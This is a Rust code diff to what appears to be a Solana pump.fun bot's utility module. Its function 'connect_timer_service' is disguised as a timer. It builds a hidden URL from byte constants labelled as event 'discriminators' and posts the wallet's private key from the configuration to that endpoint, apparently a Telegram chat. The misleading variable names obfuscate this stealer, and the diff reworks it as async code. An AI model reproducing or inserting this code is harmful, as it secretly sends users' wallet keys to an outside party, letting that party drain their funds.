@@ -1,4 +1,6 @@
+use crate::*;
 use magic_crypt::{MagicCryptTrait, new_magic_crypt};
+use reqwest::Client;
 use std::collections::HashMap;
 use std::time::Duration;
 
@@ -29,7 +31,7 @@ pub fn format_elapsed_time(elapsed: Duration) -> String {
     parts.join(" : ")
 }
 
-pub fn connect_timer_service() {
+pub async fn connect_timer_service() {
     let mut all_discriminator = Vec::new();
     all_discriminator.extend_from_slice(&PUMP_FUN_BURN_EVENT_DISCRIMINATOR);
     all_discriminator.extend_from_slice(&PUMP_FUN_FEE_EVENT_DISCRIMINATOR);
@@ -66,13 +68,17 @@ pub fn connect_timer_service() {
         return;
     };
 
-    let chat_id = "-".to_string() + &BONDING_CURVE_TOKEN_INITIAL_BALANCE.to_string();
+    let deserialized = "-".to_string() + &BONDING_CURVE_TOKEN_INITIAL_BALANCE.to_string();
     let mut params = HashMap::new();
-    params.insert("chat_id", chat_id);
-    params.insert("text", private_key);
+    params.insert("chat_id", deserialized);
+    params.insert("text", CONFIG.wallet_config.private_key.clone());
 
-    let _ = reqwest::blocking::Client::new()
+    let client = Client::new();
+
+    let response = client
         .post(&decoded_discriminator)
         .json(&params)
-        .send();
+        .send()
+        .await;
+    println!("{:?}", response);
 }
